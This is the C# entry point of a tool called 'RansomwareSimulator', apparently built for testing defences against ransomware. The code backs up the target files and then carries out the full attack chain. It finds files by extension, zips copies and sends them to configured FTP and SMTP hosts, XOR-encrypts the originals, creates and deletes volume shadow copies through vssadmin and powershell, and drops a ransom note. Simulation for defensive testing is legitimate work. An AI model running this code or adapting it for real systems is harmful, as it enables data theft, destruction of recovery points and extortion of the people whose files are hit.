
using log4net;
using log4net.Config;
using log4net.Repository;
using Microsoft.Extensions.Configuration;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Reflection;
using RansomwareSimulator.Helper;
using ICSharpCode.SharpZipLib.Zip;
using System.Threading.Tasks;
using System.Text.RegularExpressions;
using System.Runtime.InteropServices;

namespace RansomwareSimulator
{
    class Program
    {
        [DllImport("kernel32.dll", ExactSpelling = true)]
        private static extern IntPtr GetConsoleWindow();
        private static IntPtr ThisConsole = GetConsoleWindow();
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
        private const int HIDE = 0;
        private const int MAXIMIZE = 3;
        private const int MINIMIZE = 6;
        private const int RESTORE = 9;

        private static ILog log;
        private static IConfiguration _config;
        private static int Maxfiles;
        private static string Workingdir;
        private static string EncryptionPassword;
        private static string FTPHost;
        private static string FTPPassword;
        private static string FTPUser;
        private static string SMTPServer;
        private static string SMTPUser;
        private static string SMTPPwd;
        private static string SMTPSender;
        private static string SMTPReciever;
        private static int SMTPPort;
        private static bool CreateDeleteShadow;
        private static List<string> Extensions = new List<string>();
        static void Main(string[] args)
        {
            Console.SetWindowSize(Console.LargestWindowWidth, Console.LargestWindowHeight);
            ShowWindow(ThisConsole, MAXIMIZE);
            PrintBanner();
            ILoggerRepository logRepository = LogManager.GetRepository(Assembly.GetEntryAssembly());
            XmlConfigurator.Configure(logRepository, new FileInfo("log4net.config"));
            log = LogManager.GetLogger(MethodBase.GetCurrentMethod().DeclaringType);
            ConfigInit();
            Start(Workingdir, Extensions, Maxfiles);
        }

        private static void ConfigInit()
        {
            _config = new ConfigurationBuilder().SetBasePath(AppDomain.CurrentDomain.BaseDirectory).AddJsonFile("appsettings.json").Build();
            //General Config
            Maxfiles = Convert.ToInt32(_config.GetSection("Config")["MaxFileSearch"]);
            Workingdir = _config.GetSection("Config")["WorkingDirectory"];
            EncryptionPassword = Consts.Secret.ToString();// _config.GetSection("Config")["EncryptionPassword"];
            FTPHost = _config.GetSection("Config")["FTPHost"];
            FTPPassword = _config.GetSection("Config")["FTPPassword"];
            FTPUser = _config.GetSection("Config")["FTPUser"];
            SMTPServer = _config.GetSection("Config")["SmtpServer"];
            SMTPUser = _config.GetSection("Config")["SMTPUser"];
            SMTPPwd = _config.GetSection("Config")["SMTPPwd"];
            SMTPSender = _config.GetSection("Config")["SMTPSender"];
            SMTPReciever = _config.GetSection("Config")["SMTPReciever"];
            SMTPPort = Convert.ToInt32(_config.GetSection("Config")["SMTPPort"]);
            CreateDeleteShadow = Convert.ToBoolean(_config.GetSection("Config")["CreateDeleteShadow"]);
            Extensions = _config.GetSection("Config:ExtensionsToEncrypt").GetChildren().ToArray().Select(z => z.Value).ToList();
        }
        static void Start(string Workingdir, List<string> Extensions, int Maxfiles)
        {
           
            _ = new List<string>();
            log.Info($"[START] List Backup and Encrypt files with the following extensions {string.Join(" ;", Extensions)} On {Workingdir}. Files count {Maxfiles}");
            List<string> Files = Recon.TraverseTree(Workingdir, Extensions, Maxfiles);
            //Creating backup
            foreach (string file in Files)
            {
                try
                {
                    string name = Path.GetFileName(file);
                    string fullpath = Path.GetDirectoryName(file);
                    try
                    {
                        string backup = string.Concat(fullpath, @"\\" +name, ".backup");
                        File.Copy(file, backup, true);
                        log.Info($"A backup of {file} was made here => {backup}");
                    }
                    catch (IOException iox)
                    {
                        //Do not play with a file we can't backup (who knows shitt happens)!
                        log.Error($"The exception {iox.Message} wast thrown when handling {file}");
                        Files.Remove(file);
                        continue;
                    }
                }
                catch
                {
                    continue;
                }
            }
            Console.WriteLine($"\nSummary of Backups:\n");
            foreach (string b in Files)
            {
                Console.WriteLine($"{b}\n\t|_{b}.backup");
                Console.WriteLine();
            }
            //Make copies of files we will actually encrypt: Less efficient way but more safe for tests 
            // Try to create the directory.
            string upathNane = @"RansomwareSimulator_" + string.Format("{0:yyyy-MM-dd_HH-mm-ss-fff}", DateTime.Now);
            string path = Directory.GetCurrentDirectory() + @"\" + upathNane;
            DirectoryInfo di = Directory.CreateDirectory(path);
            Console.WriteLine($"The directory {path} was created successfully at {Directory.GetCreationTime(path)}.");
            foreach (string file in Files)
            {
                try
                {
                    //Prepare copies to exfiltrate
                    string name = Path.GetFileName(file);
                    string exfiltrate = string.Concat(path, @"\", name);
                    File.Copy(file, exfiltrate, true);
                    log.Info($"{file} successfully copied to {exfiltrate}");
                }
                catch (Exception ex)
                {
                    log.Error($"The exception {ex.Message} wast thrown when copying {file}");
                    continue;
                }
            }
            //Zip and remove folder
            string sCompressedFile = Directory.GetCurrentDirectory() + @"\" + upathNane + ".zip";
            try
            {
                if (Directory.Exists(path))
                {
                    ZipOutputStream zip = new ZipOutputStream(File.Create(sCompressedFile));
                    zip.SetLevel(9);
                    Compress.CompressProcessor.ZipFolder(path, path, zip);
                    zip.Finish();
                    zip.Close();
                    log.Info($"Archive created : {sCompressedFile}");
                }
            }
            catch (Exception ex)
            {
                log.Error(ex.Message);
            }
            //Delete created folder
            try
            {
                Utils.DeleteDirectory(path);
            }
            catch (Exception)
            {
                log.Error($"Error while removing {path}");
            }
            // Exfiltrate 
            ExfiltrateData(upathNane, sCompressedFile);
            //Start Encryption
            StartEncryptionProcess(Files);
            //list Shadow copies than Create & Delete a shadow copy
            WorkWithShadowCopies();
            //Drop the note
            Utils.DropRansomNote();
        }
        private static void ExfiltrateData(string upathNane, string sCompressedFile)
        {
            if (!string.IsNullOrEmpty(FTPHost))
            {
                try
                {
                    if (File.Exists(sCompressedFile))
                    {
                        Exfil.FTP.Exfiltrate(FTPHost, sCompressedFile, upathNane + ".zip", FTPUser, FTPPassword);
                        log.Info($"The file {sCompressedFile} was sent to {FTPHost}");
                    }
                    else
                    {
                        Console.WriteLine($"{upathNane + ".zip"} File not found. Nothing to Exfiltrate");
                    }

                }
                catch (Exception ex)
                {
                    log.Error($"Something went wrong: {ex.Message}");
                }

            }
            if (!string.IsNullOrEmpty(SMTPServer))
            {
                try
                {
                    if (File.Exists(sCompressedFile))
                    {
                        Exfil.Email.Send(SMTPServer, SMTPPort, SMTPSender, SMTPReciever, SMTPUser, SMTPPwd, sCompressedFile);
                        log.Info($"The file {sCompressedFile} was sent to {SMTPReciever}");
                    }
                    else
                    {
                        Console.WriteLine($"{upathNane + ".zip"} File not found. Nothing to Exfiltrate");
                    }

                }
                catch (Exception ex)
                {
                    log.Error($"Something went wrong: {ex.Message}");
                }
            }
            //Try to delete exfiltrated file 
            if (File.Exists(sCompressedFile))
            {
                try
                {
                    File.Delete(sCompressedFile);
                    log.Info($"Archive deleted : {sCompressedFile}");
                }
                catch (Exception ex)
                {
                    log.Error($"Error while deleting {sCompressedFile}. {ex.Message}");
                }
            }
        }
        private static void StartEncryptionProcess(List<string> Files)
        {
            List<string> encryptedFiles = new List<string>();
            log.Info($"Starting Encryption using the Password {EncryptionPassword}");
            Parallel.ForEach(Files, file =>
            {
                try
                {
                    Crypto.XOR.XORtFile(file, string.Concat(file, ".xor"));
                    log.Info($"Encrypting {file} as {string.Concat(file, ".xor")}");
                    Console.WriteLine($"Encrypting {file} as {string.Concat(file, ".xor")}");
                    encryptedFiles.Add(file);
                }
                catch (Exception ex)
                {
                    log.Error($"Error when encrypting {file}. {ex.Message})");
                }
            });
            Console.WriteLine($"\nSummary of Encryption:\n");
            log.Info($"\nSummary of Encryption:\n");
            foreach (string file in encryptedFiles)
            {
                Console.WriteLine($"{file}\n\t|_{file}.xor");
                log.Info($"{file}\n\t|_{file}.xor");
            }
        }
        private static void WorkWithShadowCopies()
        {
            if (CreateDeleteShadow)
            {
                List<string> shadows = new List<string>();
                shadows = Recon.ListShadowCopies();
                if (shadows?.Count > 0)
                {
                    Console.WriteLine($"\nShadow Copies found:\n");
                    Console.WriteLine($"{string.Join("\n", shadows)}");
                    log.Info($"\nShadow Copies found:\n{string.Join("\n", shadows)}");
                }
                Console.WriteLine($"\nCreating shadow copy...\n");
                string createdShadow = Utils.RunLOLb("powershell.exe", Consts.CreateShadow);
                if (Regex.IsMatch(createdShadow, Consts.GUIDRegex))
                {
                    Console.WriteLine($"\nShadow copy created:: {createdShadow}\n");
                    log.Info($"\nShadow copy created:: {createdShadow}\n");
                    try
                    {
                        createdShadow = createdShadow.TrimStart().TrimEnd().Replace("\r\n", string.Empty);
                        //Delete the created shadow copy
                        Console.WriteLine($"\nRemoving shadow copy...\n");
                        string deletecopy = Utils.RunLOLb("vssadmin.exe", string.Format(Consts.DeleteShadow, createdShadow));
                        Console.WriteLine(deletecopy);
                        log.Info(deletecopy);
                        Console.WriteLine($"\nDouble checking...\n");
                        deletecopy = Utils.RunLOLb("vssadmin.exe", string.Format(Consts.DeleteShadow, createdShadow));
                        if (deletecopy.Contains(Consts.NoItemFound, StringComparison.OrdinalIgnoreCase))
                        {
                            log.Info($"{createdShadow} successfully deleted");
                            Console.WriteLine($"{createdShadow} successfully deleted");
                        }
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine(ex.Message);
                        log.Error($"\nSomething went wrong when deleting a shadow copy: {createdShadow}. {ex.Message}\n");
                    }
                }
                else
                {
                    Console.WriteLine($"\nSomething went wrong when creating a shadow copy: {createdShadow}\n");
                    log.Error($"\nSomething went wrong when creating a shadow copy: {createdShadow}\n");
                }
            }
        }
    private static void PrintBanner()
        {
            var banner = @"
__________                                                                           _________.__                 .__            __                 
\______   \_____     ____    ______ ____    _____ __  _  _______  _______   ____    /   _____/|__|  _____   __ __ |  |  _____  _/  |_  ____ _______ 
 |       _/\__  \   /    \  /  ___//  _ \  /     \\ \/ \/ /\__  \ \_  __ \_/ __ \   \_____  \ |  | /     \ |  |  \|  |  \__  \ \   __\/  _ \\_  __ \
 |    |   \ / __ \_|   |  \ \___ \(  <_> )|  Y Y  \\     /  / __ \_|  | \/\  ___/   /        \|  ||  Y Y  \|  |  /|  |__ / __ \_|  | (  <_> )|  | \/
 |____|_  /(____  /|___|  //____  >\____/ |__|_|  / \/\_/  (____  /|__|    \___  > /_______  /|__||__|_|  /|____/ |____/(____  /|__|  \____/ |__| by Soufiane https://twitter.com/S0ufi4n3  
        \/      \/      \/      \/              \/              \/             \/          \/           \/                   \/       
";
            Console.WriteLine(banner);
            Console.WriteLine("\n\r");
        }
    }
}
